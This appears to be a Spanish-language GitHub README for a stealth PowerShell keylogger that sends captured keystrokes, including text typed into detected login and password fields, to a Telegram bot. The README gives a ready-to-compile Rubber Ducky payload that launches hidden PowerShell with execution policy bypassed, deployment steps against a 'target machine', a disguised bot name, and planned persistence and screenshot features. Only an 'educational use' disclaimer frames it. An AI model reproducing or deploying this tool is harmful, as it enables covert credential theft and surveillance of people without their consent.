# 🔐 Keylogger Stealth - PowerShell + Rubber Ducky

![version](https://img.shields.io/badge/version-2.0-blue)
![PowerShell](https://img.shields.io/badge/PowerShell-5.0+-blue)
![Telegram Bot API](https://img.shields.io/badge/Telegram-Bot_API-green)

Un keylogger avanzado escrito en PowerShell que se ejecuta de forma completamente **stealth** mediante Rubber Ducky o manualmente con un archivo batch.

> ⚠️ **Advertencia**: este proyecto es estrictamente para fines educativos y de investigación en seguridad. El uso de este software en sistemas sin autorización explícita es ilegal y no ético. No me hago responsable del mal uso de esta herramienta..

---

## ⚡ Características Principales

- 🕵️ **Stealth Total**: Ejecución en background sin ventanas visibles.
- 📱 **Notificaciones en Telegram**: Envío en tiempo real con ofuscación.
- ⌨️ **Captura Completa**: Teclado español, símbolos especiales, AltGr.
- 🦆 **Compatible Rubber Ducky**: Inyección automática con `inject.bin`.
- 🔧 **Ejecución Manual**: Alternativa con archivo `.bat`.
- 🎯 **Detección Inteligente**: Campos sensibles, cambios de ventana.
- 🔒 **Ofuscación**: Mensajes comprimidos y codificados en Base64.

---

## 📁 Estructura del Proyecto

```text
Keylogger-Stealth/
├── 📄 keylogger.ps1          # Script principal del keylogger
├── 🦆 inject.bin             # Payload para Rubber Ducky
├── ⚡ execute.bat            # Ejecución manual alternativa
└── 📖 README.md              # Este archivo
```

---

## 🚀 Instrucciones Rápidas

### Método 1: Rubber Ducky (Recomendado)

1. Convierte el código `inject.bin` en Duck Toolkit.
2. Copia el `.bin` a la microSD del Rubber Ducky.
3. Conecta al equipo objetivo.
4. En 3-5 segundos estará ejecutándose.

### Método 2: Ejecución Manual

1. Doble clic en `execute.bat`.
2. La ventana se cierra automáticamente.
3. El keylogger queda en background.

---

## 🛠️ Configuración Detallada

### 1. Configurar Bot de Telegram

```bash
# Buscar @BotFather en Telegram
/mysetname → "System Monitor Bot"
/mysetdescription → "Sistema de monitorización remota"
/setuserpic → Subir imagen (150x150px)
/setcommands → Configurar comandos disponibles
```

### 2. Personalizar Keylogger

Edita `keylogger.ps1` y configura:

```powershell
$token = "TU_BOT_TOKEN_AQUI"
$chatId = "TU_CHAT_ID_AQUI"
```

### 3. Compilar `inject.bin`

```bash
# Usar Duck Toolkit Online:
https://ducktoolkit.com/encoder

# Código para compilar:
DELAY 1500
GUI r
DELAY 600
STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File keylogger.ps1' -WindowStyle Hidden; Start-Sleep 2; exit"
DELAY 400
ENTER
DELAY 3000
ALT F4
```

---

## 📊 Características Técnicas

### ⌨️ Captura de Teclado

- **Letras**: A-Z, Ñ/ñ (español completo)
- **Números**: 0-9
- **Símbolos**: `!"·$%&/()=@#~€`
- **Teclas Especiales**: `[ENTER]`, `[BACKSPACE]`, `[TAB]`
- **Combinaciones**: AltGr, Shift, Ctrl

### 🔄 Estrategia de Envío

- **Por cantidad**: Cada 10-15 caracteres
- **Por tiempo**: Máximo 30-60 segundos
- **Por eventos**: Cambios de ventana
- **Campos sensibles**: Detecta login/password

### 🛡️ Características Stealth

- Cero ventanas visibles
- Proceso independiente (sobrevive a cierre de ventanas)
- Ofuscación Base64 + GZip
- Sin escritura en disco (opcional)

---

## ⚙️ Comandos de Telegram

```text
/status   - Estado del sistema
/clear    - Borrar historial de mensajes
/help     - Ayuda y soporte
```

---

## 🛑 Cómo Detener el Keylogger

### Método 1: PowerShell (Administrador)

```powershell
# Detener proceso específico
Get-CimInstance Win32_Process | Where-Object {$_.CommandLine -like "*keylogger.ps1*"} | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }

# Detener todos los PowerShell
Stop-Process -Name "powershell" -Force
```

### Método 2: CMD

```cmd
taskkill /f /im powershell.exe
```

### Método 3: Administrador de Tareas

1. `Ctrl + Shift + Esc`
2. Buscar **"Windows PowerShell"**
3. Clic derecho → **"Finalizar tarea"**

---

## 🔍 Troubleshooting

### ❌ No llegan mensajes a Telegram

- Verificar token y chat ID.
- Comprobar conexión a internet.
- Ejecutar en modo debug: `powershell -File keylogger.ps1`.

### ❌ Ventana no se cierra

- Usar la versión `.bat` alternativa.
- Verificar permisos de ejecución.
- Ejecutar como administrador.

### ❌ No captura teclas

- Verificar layout de teclado español.
- Probar en diferentes aplicaciones.
- Comprobar antivirus/bloqueos.

---

## ⚠️ Advertencias Legales

> 🚨 **USO ÉTICO ÚNICAMENTE**

Este software está diseñado para:

- ✅ Pruebas de penetración autorizadas
- ✅ Auditorías de seguridad
- ✅ Investigación educativa
- ✅ Monitorización de sistemas propios

**Está totalmente prohibido:**

- ⛔ Monitorización sin consentimiento
- ⛔ Acceso no autorizado a sistemas
- ⛔ Robo de credenciales
- ⛔ Actividades maliciosas

El desarrollador **no se hace responsable** del uso indebido de este software.

---

## 🎯 Roadmap

- Captura de clipboard
- Screenshots periódicos
- Persistencia en registro
- Exclusión de procesos específicos
- Rotación de tokens Telegram
- Compresión avanzada de datos

---

## 🤝 Contribuciones

Las contribuciones son bienvenidas. Por favor:

1. Haz **fork** del proyecto.
2. Crea una **rama** para tu feature.
3. **Commit** tus cambios.
4. **Push** a la rama.
5. Abre un **Pull Request**.

---

## 📝 Licencia

Este proyecto es para fines educativos. El uso es responsabilidad del usuario.

---

## 🔗 Enlaces Útiles

- Rubber Ducky Official
- Duck Toolkit
- Telegram Bot API

---

⭐ Si este proyecto te fue útil, por favor dale una **estrella** en GitHub.
